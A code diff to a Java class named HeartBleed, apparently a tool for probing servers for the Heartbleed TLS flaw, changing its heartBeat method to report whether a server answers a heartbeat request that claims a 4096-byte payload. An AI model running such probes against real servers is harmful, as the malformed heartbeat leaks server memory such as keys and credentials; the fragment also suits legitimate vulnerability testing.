@@ -76,8 +76,8 @@ public class HeartBleed {
     }
 
     //sends/receives the heartbeat
-    public void heartBeat(String message) throws IOException {
-
+    public synchronized boolean heartBeat(String message) throws IOException {
+        boolean statusServer=false;
         System.out.println("Sending Heartbeat...");
         outStr.write(makeHeartBeat(message, 4096));
         outStr.flush();
@@ -88,14 +88,21 @@ public class HeartBleed {
             if (finalMessage.type == 24) {
                 System.out.println("Heartbeat recieved!");
                 System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
+                statusServer=true;
                 break;
             }
             if (finalMessage.type == 21) {
                 System.out.println("Error");
+                statusServer=false;
+                break;
+            }
+            if (finalMessage.type == 0){
+                System.out.println("No heartbeat response received, server likely not vulnerable");
+                statusServer=false;
                 break;
             }
         }
-
+        return statusServer;
     }
 
     public void save() throws IOException {
